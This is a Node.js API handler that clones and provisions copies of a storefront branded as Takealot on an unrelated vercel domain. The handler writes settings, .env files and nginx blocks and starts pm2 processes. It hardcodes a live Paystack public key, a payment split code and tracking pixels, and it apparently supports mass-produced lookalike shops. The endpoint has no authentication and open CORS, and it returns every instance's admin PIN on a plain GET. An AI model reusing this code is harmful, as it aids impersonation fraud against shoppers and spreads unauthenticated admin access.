// api/clone-instance.js
// Automated multi-store instance cloning & provisioning engine.
// Creates new isolated store instances (e.g. /takealot2/) with dedicated admin, gateway, and tracking.

'use strict';

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const BASE_DIR = '/var/www';
const SOURCE_DIR = path.join(BASE_DIR, 'takealot');
const NGINX_INSTANCES_DIR = '/etc/nginx/takealot_instances';

function sanitizeSlug(slug) {
  return String(slug || '')
    .toLowerCase()
    .trim()
    .replace(/[^a-z0-9\-]/g, '');
}

function findAvailablePort(startPort = 3002) {
  let port = startPort;
  let activePorts = new Set();
  try {
    const out = execSync('ss -tlpn || netstat -tlpn', { encoding: 'utf8' });
    const matches = out.match(/:(\d+)/g) || [];
    for (const m of matches) {
      activePorts.add(parseInt(m.replace(':', ''), 10));
    }
  } catch (_) {}

  while (activePorts.has(port) || port < 3001) {
    port++;
  }
  return port;
}

function listInstances() {
  const instances = [];
  if (fs.existsSync(NGINX_INSTANCES_DIR)) {
    const files = fs.readdirSync(NGINX_INSTANCES_DIR).filter(f => f.endsWith('.conf') && f !== 'default.conf');
    for (const file of files) {
      const slug = file.replace('.conf', '');
      const confPath = path.join(NGINX_INSTANCES_DIR, file);
      let port = null;
      try {
        const content = fs.readFileSync(confPath, 'utf8');
        const match = content.match(/127\.0\.0\.1:(\d+)/);
        if (match) port = parseInt(match[1], 10);
      } catch (_) {}

      let adminPin = 'takealot2026';
      let activeGateway = 'paystack';
      const settingsPath = path.join(BASE_DIR, slug, 'data', 'settings.json');
      if (fs.existsSync(settingsPath)) {
        try {
          const s = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
          if (s.adminPin) adminPin = s.adminPin;
          if (s.activeGateway) activeGateway = s.activeGateway;
        } catch (_) {}
      }

      instances.push({
        slug,
        port,
        storeUrl: `https://ps5fim-s11m.vercel.app/${slug}/`,
        adminUrl: `https://ps5fim-s11m.vercel.app/${slug}/admin.html`,
        adminPin,
        activeGateway
      });
    }
  }
  return instances;
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Admin-Pin');
  res.setHeader('Cache-Control', 'no-store');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // LIST INSTANCES
  if (req.method === 'GET') {
    const instances = listInstances();
    return res.status(200).json({ success: true, count: instances.length, instances });
  }

  // CREATE OR DELETE INSTANCE
  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
    }
    body = body || {};

    const action = body.action || 'clone';

    // DELETE INSTANCE
    if (action === 'delete') {
      const slug = sanitizeSlug(body.slug);
      if (!slug || slug === 'takealot') {
        return res.status(400).json({ error: 'Invalid or protected slug' });
      }

      try {
        try { execSync(`pm2 delete ${slug}`, { stdio: 'ignore' }); } catch (_) {}
        const confPath = path.join(NGINX_INSTANCES_DIR, `${slug}.conf`);
        if (fs.existsSync(confPath)) fs.unlinkSync(confPath);
        execSync('nginx -s reload', { stdio: 'ignore' });
        return res.status(200).json({ success: true, message: `Instância /${slug}/ removida com sucesso.` });
      } catch (err) {
        return res.status(500).json({ error: 'Erro ao remover instância: ' + err.message });
      }
    }

    // CLONE / CREATE NEW INSTANCE
    const rawSlug = body.slug || '';
    const slug = sanitizeSlug(rawSlug);

    if (!slug || slug.length < 3) {
      return res.status(400).json({ error: 'Slug inválido. Use ao menos 3 caracteres alfanuméricos (ex: takealot2).' });
    }

    const RESERVED = ['takealot', 'api', 'admin', 'restaurante', 'static', 'assets', 'data', 'nginx'];
    if (RESERVED.includes(slug)) {
      return res.status(400).json({ error: `O slug "${slug}" é reservado pelo sistema.` });
    }

    const targetDir = path.join(BASE_DIR, slug);
    if (fs.existsSync(targetDir)) {
      return res.status(400).json({ error: `A instância /${slug}/ já existe no servidor!` });
    }

    const adminPin = (body.adminPin || 'takealot2026').trim();
    const gateway = 'paystack';
    const port = findAvailablePort(3002);

    try {
      // 1. Create target directory
      fs.mkdirSync(targetDir, { recursive: true });

      // 2. Clone source codebase to target (rsync)
      execSync(`rsync -a --exclude 'node_modules' --exclude '.git' --exclude 'data' ${SOURCE_DIR}/ ${targetDir}/`, { stdio: 'inherit' });

      // 3. Symlink node_modules to save space and enable instant boot
      const nodeModulesTarget = path.join(targetDir, 'node_modules');
      if (!fs.existsSync(nodeModulesTarget)) {
        execSync(`ln -s ${SOURCE_DIR}/node_modules ${nodeModulesTarget}`);
      }

      // 4. Create fresh isolated data directory
      const targetDataDir = path.join(targetDir, 'data');
      fs.mkdirSync(targetDataDir, { recursive: true });

      let parentFees = { enabled: false, name: 'Express Delivery & Tracking', amount: 0 };
      let parentFinancialRates = { stripePercent: 2.9, stripeFixed: 2.0, payoutPercent: 5.0 };
      try {
        const { loadSettings } = require('./settings');
        const ps = loadSettings();
        if (ps.fees) parentFees = ps.fees;
        if (ps.financialRates) parentFinancialRates = ps.financialRates;
      } catch (_) {}

      // Create initial settings.json for the new instance
      const initialSettings = {
        activeGateway: 'paystack',
        adminPin: adminPin,
        stripe: {
          publishableKey: '',
          secretKey: ''
        },
        paystack: {
          publicKey: (body.paystackPublicKey || '').trim() || 'pk_live_bc75401ffbdd4db7b0478916562fdb14a8d77423',
          secretKey: (body.paystackSecretKey || '').trim() || '',
          splitCode: (body.paystackSplitCode || '').trim() || 'SPL_8ZpdS87KaP'
        },
        tracking: {
          utmifyScriptUrl: (body.utmifyScriptUrl || 'https://cdn.utmify.com.br/scripts/utms/latest.js').trim(),
          utmifyPixelId: (body.utmifyToken || body.utmifyPixelId || '').trim(),
          utmifyToken: (body.utmifyToken || body.utmifyPixelId || '').trim(),
          facebookPixelIds: (body.facebookPixelIds || '').trim()
        },
        fees: parentFees,
        financialRates: parentFinancialRates,
        createdAt: new Date().toISOString()
      };
      fs.writeFileSync(path.join(targetDataDir, 'settings.json'), JSON.stringify(initialSettings, null, 2), 'utf8');

      // 6. Create dedicated .env for new instance
      const envContent = [
        `PORT=${port}`,
        `HOST=0.0.0.0`,
        `ADMIN_PIN=${adminPin}`,
        `PAYSTACK_PUBLIC_KEY=${initialSettings.paystack.publicKey}`,
        `PAYSTACK_SECRET_KEY=${initialSettings.paystack.secretKey}`,
        `PAYSTACK_SPLIT_CODE=${initialSettings.paystack.splitCode}`,
        `RESEND_API_KEY=`,
        `EMAIL_FROM="Takealot Orders <onboarding@resend.dev>"`
      ].join('\n');
      fs.writeFileSync(path.join(targetDir, '.env'), envContent, 'utf8');

      // 7. Write Nginx block for new slug
      if (!fs.existsSync(NGINX_INSTANCES_DIR)) {
        fs.mkdirSync(NGINX_INSTANCES_DIR, { recursive: true });
      }

      const nginxConf = `
location ^~ /${slug}/ {
    proxy_pass http://127.0.0.1:${port}/;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto https;
    proxy_cache_bypass $http_upgrade;
}
`;
      fs.writeFileSync(path.join(NGINX_INSTANCES_DIR, `${slug}.conf`), nginxConf.trim(), 'utf8');

      // 8. Test and reload Nginx
      execSync('nginx -t && nginx -s reload');

      // 9. Start PM2 process with explicit port argument
      execSync(`pm2 start ${path.join(targetDir, 'server.js')} --name ${slug} --cwd ${targetDir} --update-env -- --port ${port} && pm2 save`);

      const result = {
        success: true,
        message: `Instância /${slug}/ criada e online com sucesso!`,
        slug: slug,
        port: port,
        storeUrl: `https://ps5fim-s11m.vercel.app/${slug}/`,
        adminUrl: `https://ps5fim-s11m.vercel.app/${slug}/admin.html`,
        adminPin: adminPin,
        gateway: gateway
      };

      console.log(`[clone-instance] Successfully created instance: ${slug} on port ${port}`);
      return res.status(200).json(result);

    } catch (err) {
      console.error('[clone-instance] Creation failed:', err);
      return res.status(500).json({ error: 'Erro ao provisionar instância: ' + err.message });
    }
  }

  return res.status(405).json({ error: 'Method Not Allowed' });
};
